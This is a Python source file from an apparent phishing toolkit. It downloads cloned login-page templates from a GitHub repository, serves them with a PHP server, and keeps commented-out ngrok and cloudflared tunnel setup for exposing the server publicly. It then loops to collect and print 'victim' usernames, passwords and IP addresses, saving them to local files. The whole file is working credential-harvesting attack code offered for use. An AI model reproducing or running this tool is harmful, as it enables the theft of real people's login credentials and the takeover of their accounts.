import os
from os import popen, system
from time import sleep

def requirements(folder):
    from main import check_intr, info2, info, error, ask, nrml, success, blue, cyan, red, green, bgreen, root, yellow
    while True:
        if os.path.exists(root+"/.websites/"+folder):
            if not os.path.isfile(root+"/.websites/"+folder+"/index.html"):
                system(f"rm -rf {root}/.websites/{folder}")
                requirements(folder)
            else:
                system("cp -r $HOME/.websites/"+folder+"/* $HOME/.site")
                break
        else:
            check_intr()
            print("\n"+info+"Downloading required files.....\n"+nrml)
            check_intr()
            system(f"wget -q --show-progress https://github.com/CodingSangh/NPhish/raw/main/Websites/{folder}.zip -O websites.zip")
            if not os.path.exists(root+"/.websites"):
                system("cd $HOME && mkdir .websites")
            system("cd $HOME/.websites && mkdir "+folder)
            system(f"unzip websites.zip -d $HOME/.websites/  > /dev/null 2>&1 ")
            os.remove("websites.zip")
            system("cp -r $HOME/.websites/"+folder+"/* $HOME/.site")
            break

    system("mv -f .info.txt $HOME/.site")
    server()

def killer():
    if system("pidof php > /dev/null 2>&1")==0:
        system("killall php")
    if system("pidof ngrok > /dev/null 2>&1")==0:
        system("killall ngrok")
    if system("pidof cloudflared > /dev/null 2>&1")==0:
        system("killall cloudflared")
    if system("pidof curl > /dev/null 2>&1")==0:
        system("killall curl")
    if system("pidof wget > /dev/null 2>&1")==0:
        system("killall wget")
    if system("pidof unzip > /dev/null 2>&1")==0:
        system("killall unzip")

def server():
    from main import check_intr, info2, info, error, ask, nrml, success, blue, cyan, red, green, bgreen, root, yellow
    system("clear")
    print("\n"+info2+"Initializing PHP server at localhost:80....")
    check_intr()
    system("cd $HOME/.site && php -S 0.0.0.0:80 > /dev/null 2>&1 &")
    sleep(2)
    while True:
        if not system("curl --output /dev/null --silent --head --fail 0.0.0.0:80"):
            print("\n"+info+"PHP Server has started successfully!")
            break
        else:
            print(error+"PHP Error")
            killer()
            exit(1)
    #line_print("\n"+info2+"Initializing tunnelers at same address.....")
    #check_intr()
    #system("cd $HOME/.cloudflaredfolder && chmod +x * && cd $HOME && rm -rf $HOME/.cloudflaredfolder/log.txt")
    #while True:
    #    if system("command -v termux-chroot > /dev/null 2>&1")==0:
    #        system("cd $HOME/.ngrokfolder && termux-chroot ./ngrok http 127.0.0.1:8080 > /dev/null 2>&1 &")
    #        system("cd $HOME/.cloudflaredfolder && termux-chroot ./cloudflared tunnel -url 127.0.0.1:8080 --logfile log.txt > /dev/null 2>&1 &")
    #        break
    #    else:
    #        system("cd $HOME/.ngrokfolder && ./ngrok http 127.0.0.1:8080 > /dev/null 2>&1 &")
    #        system("cd $HOME/.cloudflaredfolder && ./cloudflared tunnel -url 127.0.0.1:8080 --logfile log.txt > /dev/null 2>&1 &")
    #        break
    print("\n"+"Getting credentials!")
    get_credentials()

def get_credentials():
    from main import check_intr, info2, info, error, ask, nrml, success, blue, cyan, red, green, bgreen, root, yellow
    print("\n"+info+blue+"Waiting for login info...."+cyan+"Press "+red+"Ctrl+C"+cyan+" to exit")
    try:
        while True:
            if os.path.isfile(root+"/.site/usernames.txt"):
                print("\n\n"+success+bgreen+"Victim login info found!\n\007")
                with open(root+"/.site/usernames.txt","r") as userfile:
                    userdata=userfile.readlines()
                    j=0
                    o=len(userdata)
                    while j<o:
                        print(cyan+'['+green+'*'+cyan+'] '+yellow+userdata[j],end="")
                        j+=1
                print("\n"+info+"Saved in usernames.txt")
                print("\n"+info+blue+"Waiting for next....."+cyan+"Press "+red+"Ctrl+C"+cyan+" to exit")
                system("cat $HOME/.site/usernames.txt >> usernames.txt")
                os.remove(root+"/.site/usernames.txt")
            sleep(0.75)
            if os.path.isfile(root+"/.site/ip.txt"):
                os.system("clear")
                print("\n\n"+success+bgreen+"Victim IP found!\n\007")
                with open(root+"/.site/ip.txt","r") as ipfile:
                    ipdata=ipfile.readlines()
                    h=0
                    p=len(ipdata)
                    while h<p:
                        print(cyan+'['+green+'*'+cyan+'] '+yellow+ipdata[h], end="")
                        h+=1
                print("\n"+info+"Saved in ip.txt")
                print("\n"+info+blue+"Waiting for next...."+cyan+"Press "+red+"Ctrl+C"+cyan+" to exit")
                system("cat $HOME/.site/ip.txt >> ip.txt")
                os.system("rm -rf $HOME/.site/ip.txt")
            sleep(0.75)
    except:
        return
